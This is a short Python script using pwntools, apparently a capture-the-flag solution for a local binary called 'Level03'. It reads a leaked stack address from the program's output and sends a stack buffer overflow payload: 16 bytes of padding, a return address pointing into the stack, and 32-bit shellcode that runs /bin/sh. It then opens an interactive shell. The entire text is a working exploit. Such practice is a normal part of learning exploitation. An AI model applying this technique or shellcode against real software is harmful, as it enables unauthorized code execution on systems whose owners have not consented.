from pwn import*

p = process('./Level03')

p.recvuntil(b"Cai nay ")
stack_leak = int(p.recv(8),16)
shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = b"a"*16 + p32(stack_leak + 20 ) + shellcode
p.sendline(payload)

p.interactive()
